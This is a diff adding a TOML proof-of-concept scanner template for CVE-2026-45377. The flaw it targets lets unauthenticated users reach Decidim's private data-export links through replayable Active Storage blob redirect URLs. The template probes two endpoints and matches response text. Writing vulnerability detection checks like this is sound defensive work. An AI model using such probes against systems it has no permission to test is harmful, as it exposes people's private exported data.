@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "检测 Decidim download_your_data 功能中 Active Storage blob 重定向 URL 可被未认证用户重放的问题。通过访问导出下载端点，检查响应是否包含可重用的 blob 重定向 URL，验证私有数据导出链接是否存在未授权访问风险。"
+id = "POC-AVE-2026-0279"
+name = "CVE-2026-45377 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-45377",
+    "decidim",
+    "broken-access-control",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-45377",
+    "AVE-2026-0279",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/download_your_data"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "download_your_data",
+    "download?uuid=",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rails/active_storage/blobs/redirect/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "active_storage",
+    "blobs",
+    "redirect",
+]
